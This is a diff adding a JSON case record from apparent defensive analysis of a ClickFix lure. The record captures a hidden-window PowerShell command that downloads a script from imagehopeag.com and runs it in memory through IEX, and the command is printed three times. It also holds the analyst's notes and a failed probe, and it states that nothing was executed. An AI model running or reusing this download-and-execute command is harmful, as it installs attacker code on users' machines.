@@ -1,0 +1,90 @@
+{
+  "schema_version": 1,
+  "case_id": "20260825-command-pt4-pt8-pt9",
+  "analysis_date": "2026-08-25",
+  "domain": "imagehopeag.com",
+  "source": {
+    "path": "C:\\Users\\Administrator\\Desktop\\kentai\\clickfix-command.txt",
+    "sha256": "8326ca91fcb530acaebfa6a42ea240fdfc6321e73090043cc60f63bd4d8296b0",
+    "captured_labels": [
+      "pt4",
+      "pt8",
+      "pt9"
+    ],
+    "file_last_write_local": "2026-08-25T00:06:47.081740+09:00"
+  },
+  "command": {
+    "raw": "powershell -w 1 -c \"iEX([System.Net.WebClient]::new().DownloadString('https://imagehopeag.com/hex/traffic'))\"",
+    "sha256": "bb5c1b1bda6aec766c1d3091f0a48e6b56774ae6530c94c0d93603f5457a4bed",
+    "length": 109,
+    "duplicate_count": 3,
+    "pattern": "WebClient.DownloadString + Invoke-Expression",
+    "deobfuscated": null,
+    "stage_locator_raw": "https://imagehopeag.com/hex/traffic",
+    "stage_url_normalized": "https://imagehopeag.com/hex/traffic",
+    "status": "recovered_not_executed",
+    "processes": [
+      "powershell.exe"
+    ],
+    "process_chain": [
+      {
+        "sequence": 1,
+        "image": "powershell.exe",
+        "evidence": "static_command_semantics",
+        "relationship": "candidate_not_executed"
+      }
+    ],
+    "process_chain_status": "recovered_from_command_not_executed",
+    "command_line_public": "powershell -w 1 -c \"iEX([System.Net.WebClient]::new().DownloadString('https://imagehopeag.com/hex/traffic'))\"",
+    "command_line_normalized": "powershell -w 1 -c \"iEX([System.Net.WebClient]::new().DownloadString('https://imagehopeag.com/hex/traffic'))\"",
+    "command_line_length": 109,
+    "command_line_status": "recovered_not_executed",
+    "command_line_source": "analyst_provided_clickfix_command_file",
+    "command_sha256": "bb5c1b1bda6aec766c1d3091f0a48e6b56774ae6530c94c0d93603f5457a4bed"
+  },
+  "process_analysis": {
+    "processes": [
+      "powershell.exe"
+    ],
+    "process_chain": "利用者起点（Run dialogまたは既存shell） → powershell.exe → WebClient.DownloadString → 同一powershell.exe内でIEX評価",
+    "status": "static_candidate_not_observed",
+    "details": [
+      "pt4、pt8、pt9はbyte単位で同一である。",
+      "[System.Net.WebClient]::new().DownloadStringでstageを文字列として取得する。",
+      "取得結果をiEXへ直結し、ファイルへ保存せず同一process内で評価する。",
+      "-w 1はPowerShellのWindowStyle数値指定で、画面非表示を狙った指定と評価する。"
+    ]
+  },
+  "retrieval": {
+    "analyst_probe_url": "https://imagehopeag.com/hex/traffic",
+    "status": "http_403",
+    "http_status": 403,
+    "bytes": 5071,
+    "body_sha256": "2d859c90e8503f5d9fe1819c68b3ce36a30f5927d00d7d7ca61f4c10d5d38840",
+    "body_type": "html",
+    "payload_recovered": false,
+    "evidence_role": "current_context_only_not_runtime_proof",
+    "javascript_executed": false,
+    "powershell_executed": false,
+    "payload_executed": false
+  },
+  "terminal_payload": {
+    "status": "not_retrieved",
+    "family": null,
+    "sha256": null,
+    "additional_processes": [],
+    "persistence": [],
+    "final_attacker_command": null
+  },
+  "techniques": [
+    "T1204.004",
+    "T1059.001",
+    "T1105"
+  ],
+  "safety": {
+    "captured_command_executed": false,
+    "downloaded_script_executed": false,
+    "payload_executed": false,
+    "network_method": "bounded GET only"
+  }
+}
